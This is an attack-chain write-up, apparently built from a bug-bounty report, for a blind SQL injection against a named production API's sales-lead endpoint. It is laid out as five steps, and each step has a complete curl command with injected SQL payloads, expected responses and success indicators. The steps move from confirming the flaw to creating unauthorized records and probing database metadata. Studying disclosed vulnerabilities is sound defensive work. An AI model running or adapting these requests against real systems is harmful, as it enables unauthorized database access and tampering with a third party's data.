---
id: ac-uuid-001
tags:
  - sqli
  - blind-sqli
  - web-vuln
  - data-manipulation
  - information-disclosure
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
verified: false
platforms:
  - Web
  - Database
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-Blind-SQL-Injection-in-Sales-Lead-Endpoint]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.125Z'
description: >-
  A multi-step blind SQL injection attack on the PUT
  /consumer/onboarding/saleslead/{id} endpoint of api.hyperpure.com, enabling
  unauthorized sales lead creation, database manipulation, and metadata
  extraction like database name length.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Blind SQL Injection in Hyperpure Sales Lead API for Data Manipulation and Disclosure

Multi-stage attack chain demonstrating a blind SQL injection vulnerability in the sales lead onboarding endpoint, allowing attackers to manipulate database entries and extract metadata without direct error messages.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Normal Request Baseline] --> B[Prove True Condition Injection]
    B --> C[Prove False Condition Injection]
    C --> D[Always True Injection for Manipulation]
    D --> E[Metadata Extraction via Conditional Query]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Browser developer tools or [[tools/Burp-Suite]] for request modification

### Target Environment

- Web platform with API endpoint: api.hyperpure.com
- Required services/ports: HTTPS on port 443
- Network access requirements: Public internet access to the API

### Initial Access Requirements

- No credentials required; unauthenticated endpoint
- Network position: External attacker
- Prior access needed: None

## Detailed Attack Procedures

### Step 1: Send Normal PUT Request to Create Sales Lead
procedure: [[procedures/Exploit-Blind-SQL-Injection-in-Sales-Lead-Endpoint]]

**Objective**: Establish a baseline for normal sales lead creation to compare against injected responses.

**Instructions**: Use [[commands/normal-put-saleslead-creation]] to send a standard request with valid sales lead data:

```bash
curl -X PUT "https://api.hyperpure.com/consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc" \
  -H "Content-Type: application/json;charset=utf-8" \
  -H "X-Client: consumer" \
  -H "X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a" \
  -H "HeaderRoute: v2" \
  -H "APIVersion: 4.2" \
  -H "AppType: web" \
  -H "Origin: https://www.hyperpure.com/" \
  -H "Referer: https://www.hyperpure.com/register" \
  -d '{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"█████","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}'
```

**Expected Output**: HTTP/1.1 200 OK with response echoing the salesLeadId.

**Success Indicators**:
- 200 OK response with valid sales lead creation
- No errors in baseline request

### Step 2: Inject AND 1=1 to Prove True Condition
procedure: [[procedures/Exploit-Blind-SQL-Injection-in-Sales-Lead-Endpoint]]

**Objective**: Confirm SQL injection by injecting a true condition and observing response differences.

**Instructions**: Modify the URL parameter in [[commands/normal-put-saleslead-creation]] to include the payload ' AND 1=1 --+- and resend:

```bash
curl -X PUT "https://api.hyperpure.com/consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc AND 1=1 --+-" \
  -H "Content-Type: application/json;charset=utf-8" \
  -H "X-Client: consumer" \
  -H "X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a" \
  -H "HeaderRoute: v2" \
  -H "APIVersion: 4.2" \
  -H "AppType: web" \
  -H "Origin: https://www.hyperpure.com/" \
  -H "Referer: https://www.hyperpure.com/register" \
  -d '{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"█████","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}'
```

**Expected Output**: HTTP/1.1 200 OK response echoing the injected payload in salesLeadId.

**Success Indicators**:
- Successful 200 response with payload echo
- Confirms injection point without errors

### Step 3: Inject AND 1=0 to Prove False Condition
procedure: [[procedures/Exploit-Blind-SQL-Injection-in-Sales-Lead-Endpoint]]

**Objective**: Verify false condition behavior to distinguish from true injections.

**Instructions**: Replace the payload with AND 1=0 in the URL parameter and execute a modified [[commands/normal-put-saleslead-creation]]:

```bash
curl -X PUT "https://api.hyperpure.com/consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc AND 1=0 --+-" \
  -H "Content-Type: application/json;charset=utf-8" \
  -H "X-Client: consumer" \
  -H "X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a" \
  -H "HeaderRoute: v2" \
  -H "APIVersion: 4.2" \
  -H "AppType: web" \
  -H "Origin: https://www.hyperpure.com/" \
  -H "Referer: https://www.hyperpure.com/register" \
  -d '{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"█████","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}'
```

**Expected Output**: Response indicating failure or different behavior (e.g., no echo or error).

**Success Indicators**:
- Response differs from true condition (e.g., 4xx or no echo)
- Confirms conditional logic in SQL query

### Step 4: Inject OR 1=1 for Unauthorized Data Manipulation
procedure: [[procedures/Exploit-Blind-SQL-Injection-in-Sales-Lead-Endpoint]]

**Objective**: Bypass validation to create arbitrary sales lead entries.

**Instructions**: Use OR 1=1 payload in the URL to force a true condition, modifying [[commands/normal-put-saleslead-creation]]:

```bash
curl -X PUT "https://api.hyperpure.com/consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc OR 1=1 --+-" \
  -H "Content-Type: application/json;charset=utf-8" \
  -H "X-Client: consumer" \
  -H "X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a" \
  -H "HeaderRoute: v2" \
  -H "APIVersion: 4.2" \
  -H "AppType: web" \
  -H "Origin: https://www.hyperpure.com/" \
  -H "Referer: https://www.hyperpure.com/register" \
  -d '{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"█████","salesLeadId":"cool"}'
```

**Expected Output**: HTTP/1.1 200 OK allowing creation of unauthorized entry like 'cool'.

**Success Indicators**:
- Successful creation of arbitrary sales lead
- Demonstrates data manipulation capability

### Step 5: Extract Database Metadata Length
procedure: [[procedures/Exploit-Blind-SQL-Injection-in-Sales-Lead-Endpoint]]

**Objective**: Perform blind SQLi to disclose database information, such as name length.

**Instructions**: Inject a conditional payload checking length(database()) = 11 using a variant of [[commands/sqli-payload-put-saleslead]]:

```bash
curl -X PUT "https://api.hyperpure.com/consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc\" AND (length(database())) = \"11 --+-" \
  -H "Content-Type: application/json;charset=utf-8" \
  -H "X-Client: consumer" \
  -H "X-TrackingId: 8242c5a2-6325-4101-96b8-c7ed6008e92a" \
  -H "HeaderRoute: v2" \
  -H "APIVersion: 4.2" \
  -H "AppType: web" \
  -H "Origin: https://www.hyperpure.com/" \
  -H "Referer: https://www.hyperpure.com/register" \
  -d '{"address":{"addressLine":"test","cityId":34,"state":{"name":"Gujarat"},"zipCode":"388001"},"deliveryTime":0,"email":"hoteyes@wearehackerone.com","outletName":"test","phoneNumber":"███","salesLeadId":"31cf8eb0-f81e-4c99-acad-35eae89ed659"}'
```

**Expected Output**: HTTP/1.1 200 OK echoing the payload, confirming length of 11.

**Success Indicators**:
- 200 response with payload echo
- Validates database name length extraction

## Attack Chain Summary

### Key Achievements

1. Confirmed blind SQLi via conditional responses
2. Enabled unauthorized sales lead insertion
3. Extracted database metadata (name length: 11 characters)

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
